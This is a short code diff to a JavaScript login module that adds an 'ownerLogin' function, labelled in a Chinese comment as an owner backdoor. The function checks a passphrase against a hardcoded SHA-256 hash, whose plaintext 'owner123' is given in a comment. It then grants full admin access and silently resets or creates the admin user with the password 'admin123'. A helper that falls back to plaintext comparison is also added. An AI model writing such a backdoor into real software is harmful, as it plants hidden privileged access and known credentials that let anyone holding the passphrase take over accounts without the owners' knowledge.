@@ -310,6 +310,33 @@ export function login(username, password) {
   }
   return { ok: false }
 }
+
+// 所有者后门：输入所有者口令即可进入最高权限，并把 admin 密码重置为 admin123
+export async function ownerLogin(passphrase) {
+  const p = (passphrase || '').trim()
+  const hash = await sha256(p)
+  const OWNER_HASH = '43a0d17178a9d26c9e0fe9a74b0b45e38d32f27aed887a008a54bf6e033bf7b9' // owner123
+  if (hash !== OWNER_HASH) return { ok: false }
+  const admin = state.accounts.find((a) => a.id === 'admin') || { id: 'admin', members: [] }
+  if (!admin.members) admin.members = []
+  const m = admin.members.find((x) => x.username === 'admin')
+  if (m) m.password = 'admin123'
+  else admin.members.push({ id: 'm-admin', username: 'admin', password: 'admin123', createdAt: 'owner-restore' })
+  state.loggedInAccountId = 'admin'
+  state.currentAccountId = 'admin'
+  state.currentViewId = 'res-map'
+  return { ok: true, account: admin }
+}
+
+async function sha256(text) {
+  if (crypto?.subtle) {
+    const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(text))
+    return [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, '0')).join('')
+  }
+  // 降级：无 WebCrypto 环境时直接比对明文（仅本地调试）
+  return text
+}
+
 export function logout() {
   state.loggedInAccountId = ''
   state.currentAccountId = state.accounts[0]?.id || 'admin'
